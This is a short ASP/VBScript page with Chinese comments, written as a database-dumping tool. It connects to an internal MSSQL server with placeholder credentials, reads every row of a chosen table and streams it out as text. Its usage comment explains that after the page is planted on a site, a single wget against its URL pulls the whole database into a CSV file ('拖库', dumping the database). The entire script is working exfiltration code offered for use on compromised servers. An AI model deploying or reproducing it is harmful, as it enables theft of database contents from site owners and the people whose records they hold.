<%@LANGUAGE="VBSCRIPT" CODEPAGE="65001" %>'这里改编码方式
<%
'用法：如果把本程序放在[url]http://www.xxx.com/sql.asp[/url]，可以wget [url]http://www.xxx.com/sql.asp[/url] -O x.csv 来直接拖库
        Response.Buffer = True
        Server.ScriptTimeout = 2147483647
 
        str="Driver={Sql Server};Server=192.168.1.5;Uid=mssql库名;Pwd=mssql密码;Database=库名" 这里是连接字符串
        Set Conn=Server.CreateObject("Adodb.connection")
        Conn.Open str
 
        Set Rs = Server.Createobject("Adodb.Recordset") 
 
        Sqlstr="SELECT  * FROM 库名.dbo.[表名]"  '这里是导哪个库哪个表的语句
        Rs.Open Sqlstr,Conn,3,3 
 
        If(Rs.Fields.Count > 0)Then
                For I = 0 To Rs.Fields.Count - 1
                        Response.Write Rs.Fields(i).Name & "        "
                Next
                Response.Write(vbNewLine)
 
                For I = 1 To Rs.RecordCount
                                         
                        If(I Mod 100 = 0)Then
                                Response.Flush
                        End If
 
                        For J = 0 To Rs.Fields.Count - 1
                                Response.Write Rs(J) & "        "
                        Next
 
                        Response.Write(vbNewLine)
                         
                        Rs.MoveNext
                Next
        End If
 
        Rs.Close 
        Conn.Close
        If(Err <> 0)Then Response.Write(Err.Description)
        Set Rs = Nothing 
        Set Conn = Nothing 
%>